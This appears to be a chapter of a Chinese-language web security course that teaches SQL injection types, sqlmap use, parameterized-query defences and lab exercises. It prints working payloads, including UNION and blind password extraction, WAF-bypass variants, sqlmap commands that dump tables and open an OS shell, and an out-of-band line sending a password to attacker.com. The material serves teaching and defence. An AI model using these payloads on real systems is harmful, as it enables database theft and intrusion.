# Ch 6 — A03 SQL Injection 深入

> 目標：搞懂 SQL injection 各種類型 — union / blind / time-based / second-order，怎麼攻、怎麼防。

## SQL Injection 基本

「**user input 被當 SQL 一部分執行**」。

最經典例：

```python
# 爛 code
sql = "SELECT * FROM users WHERE name='" + username + "'"

# username = "alice"
# → SELECT * FROM users WHERE name='alice'  ← OK

# username = "alice' OR '1'='1"
# → SELECT * FROM users WHERE name='alice' OR '1'='1'  ← 全回傳
```

## 4 大類別

### 1. In-band（傳統）

response 直接看到 DB 結果。

#### a) Error-based

利用 SQL error 看 DB 內容：

```sql
' AND 1=CONVERT(int, (SELECT @@version))-- 
```

DB 報 error 含 `@@version` 內容 → 看到 DB 版本。

#### b) UNION-based

用 `UNION SELECT` 把資料拼到原 query 結果：

```sql
原: SELECT name, email FROM users WHERE id=1
攻: ' UNION SELECT username, password FROM admin_users-- 
完整: SELECT name, email FROM users WHERE id='' UNION SELECT username, password FROM admin_users-- '
```

response 顯示原本 user 資料 + admin 帳密。

### 2. Blind（盲注）

response 看不到資料，但能**推**：

#### a) Boolean-based

```sql
攻 1: ' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE name='admin')='a'-- 

→ response 是「user found」 vs「user not found」 → 知第 1 個字是 a
→ 試 'a' 'b' 'c' ... 一個個試
→ 試完第 1 字試第 2 字
```

慢但有用。每字 26 次試（最壞）。

#### b) Time-based

```sql
攻: ' AND IF(SUBSTRING(password,1,1)='a', SLEEP(5), 0)-- 

→ 如果第 1 字是 'a' → server 等 5 秒回
→ 從 response time 知道對錯
```

更慢但連 boolean response 都沒有 case 用。

### 3. Out-of-band

把資料送到攻擊者控制的 server：

```sql
攻 (MSSQL): '; EXEC master..xp_dirtree '\\attacker.com\share\' + (SELECT TOP 1 password FROM users)--
```

DB 對 attacker.com 發 DNS / SMB → 攻擊者收到含 password 的 query。

少見但很猛。

### 4. Second-order

第一次 input 沒 immediate 觸發，存進 DB 後**第二次 query 用到才觸發**：

```
1. attacker 註冊 username = "admin'--"
2. 系統 escape OK，存進 DB 變 "admin'--"
3. attacker 改密碼，code 寫:
   sql = "UPDATE users SET pass='new' WHERE name='" + db.get_username() + "'"
4. → UPDATE users SET pass='new' WHERE name='admin'--'
5. → 改了真 admin 的 password
```

「**儲存時 escape 但 retrieve 時當原始**」 → second-order。

## sqlmap 自動化

```bash
# 基本
sqlmap -u "http://target/page?id=1"

# 帶 cookie
sqlmap -u "http://target/page?id=1" --cookie="session=abc123"

# POST
sqlmap -u "http://target/login" --data="user=test&pass=test"

# 從 Burp request
sqlmap -r request.txt

# 看 DB
sqlmap -r request.txt --dbs
sqlmap -r request.txt -D mydb --tables
sqlmap -r request.txt -D mydb -T users --columns
sqlmap -r request.txt -D mydb -T users --dump

# OS shell（如果可以）
sqlmap -r request.txt --os-shell
```

sqlmap 自動：

- 偵測注入點
- 識別 DB 類型
- 選最佳 payload
- 取 schema / data
- 升級到 OS command

**新手 + 自動化 = 找 SQL injection 神器**。Ch 18 詳細。

## 防禦：Prepared Statements（唯一正解）

**用 parameterized query**，不要拼 SQL string。

### Python (psycopg2)

```python
# 錯
sql = "SELECT * FROM users WHERE name='" + name + "'"
cursor.execute(sql)

# 對
cursor.execute("SELECT * FROM users WHERE name=%s", (name,))
```

driver 把 `name` 當 **value** 傳，不會被當 SQL keyword。

### Node.js (pg)

```javascript
// 錯
client.query(`SELECT * FROM users WHERE name='${name}'`);

// 對
client.query('SELECT * FROM users WHERE name = $1', [name]);
```

### Java (JDBC)

```java
// 錯
String sql = "SELECT * FROM users WHERE name='" + name + "'";
stmt.executeQuery(sql);

// 對
PreparedStatement ps = conn.prepareStatement("SELECT * FROM users WHERE name=?");
ps.setString(1, name);
ps.executeQuery();
```

### ORM

ORM (SQLAlchemy / Django ORM / Sequelize / GORM) 預設用 prepared statement：

```python
# Django ORM — 安全
User.objects.filter(name=name)

# 但 raw SQL 不安全
User.objects.raw("SELECT * FROM users WHERE name='" + name + "'")
```

**用 ORM default API 90% 安全**。raw query 仍要 prepared statement。

## 不夠的「防禦」

### 1. Escape

```python
escaped = name.replace("'", "''")  # 不夠！
```

容易漏掉 unicode / 多 byte char / 特定 DB 的 escape rule。**別自己寫 escape**。

### 2. WAF

WAF 可擋常見 payload，但**容易 bypass**：

- `' OR '1'='1` → block
- `'/**/OR/**/'1'='1` → 過
- comment / unicode / encoding → 各種繞

WAF 是 defense in depth，**不是主要防禦**。

### 3. Stored procedure

「**用 stored proc 比直接 SQL 安全**」 — **不一定**。stored proc 內若也拼 SQL，照樣 injection。

### 4. 過濾關鍵字

```python
if 'SELECT' in input or 'UNION' in input:
    abort
```

繞法：大小寫、URL encoding、`SeLeCt`、`%53ELECT`。

**永遠別用黑名單**。

## 真實案例：Heartland Payment Systems（2008）

美國付款處理商，**1.34 億 credit card** 被偷：

- 攻擊者用 SQL injection 進到 web app
- 從 web 跳到內部網路
- 安裝 sniffer 抓 card transaction
- 持續 6 個月才被發現

損失 $145M。

教訓：

- SQL injection **不只是 web 問題**，可能是 entry point 跳 lateral
- defense in depth — 即使 web 被攻，內部分段也要做

## 動手練習

**1. DVWA SQL Injection**

low / medium / high 三難度都做：

- low：直接 `' OR 1=1--`
- medium：bypass `mysql_real_escape_string`（用 numeric）
- high：blind injection

**2. Juice Shop SQL injection challenges**

- "Login Admin"
- "Login Bender"
- "Database Schema"

**3. 用 sqlmap 攻 DVWA**

```bash
# 從 Burp 抓 request 存 dvwa-request.txt
sqlmap -r dvwa-request.txt --dbs
sqlmap -r dvwa-request.txt -D dvwa --tables
sqlmap -r dvwa-request.txt -D dvwa -T users --dump
```

**4. 寫 vulnerable + 修**

```python
# vulnerable
@app.route('/search')
def search():
    name = request.args.get('name')
    cursor.execute(f"SELECT * FROM users WHERE name='{name}'")
    return cursor.fetchall()

# fixed
@app.route('/search')
def search():
    name = request.args.get('name')
    cursor.execute("SELECT * FROM users WHERE name=%s", (name,))
    return cursor.fetchall()
```

Burp 對 vulnerable 試 `' OR 1=1-- ` → 全 user。對 fixed 試 → 0 results。

**5. 學 PortSwigger Academy SQL Injection**

https://portswigger.net/web-security/sql-injection

最完整免費 SQL injection lab。

## 自我檢核

- [ ] 講得出 4 種 SQL injection 類別
- [ ] 用 sqlmap 自動跑過至少 1 個 vulnerable target
- [ ] 知道 prepared statement 是唯一防禦
- [ ] 知道 escape / WAF / stored proc / 黑名單都不夠
- [ ] DVWA / Juice Shop SQL injection challenges 完成

下一章看 XSS — 注入第二大宗。

→ [Ch 7 A03 XSS](./07-a03-xss.md)
